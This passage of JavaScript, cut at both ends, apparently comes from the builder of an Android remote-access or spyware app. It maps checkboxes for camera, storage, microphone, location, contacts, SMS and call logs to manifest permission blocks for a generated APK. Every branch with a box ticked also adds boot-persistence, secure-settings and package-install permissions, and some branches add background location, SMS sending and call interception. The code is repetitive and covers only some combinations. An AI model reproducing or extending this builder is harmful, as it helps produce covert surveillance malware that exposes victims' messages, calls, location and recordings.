        var checkBoxofLocation = document.getElementById("Permissions4");
        var checkBoxofContacts = document.getElementById("Permissions5");
        var checkBoxofSms = document.getElementById("Permissions6"); 
        var checkBoxofCallsLogs = document.getElementById("Permissions7");
        //if all unchecked
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = CONSTANTS.permissions
        }
        //if all checked
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = CONSTANTS.permissions
        }
        //if only one selected
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>            
   `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>           
   ` 
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>        
   ` 
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>       
   ` 
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>` 
        }        

        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>`       
        }        
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>   
           ` 
        }  
        //if six checked
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>  
           ` 
        }  
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>`            
        }  
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>          `  }  
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }  
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
        //if two are checked 
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>        ` 
        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>        ` 
        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>        ` 
        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>        ` 
        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>        ` 
        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>        ` 
        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>        ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>        ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>        ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
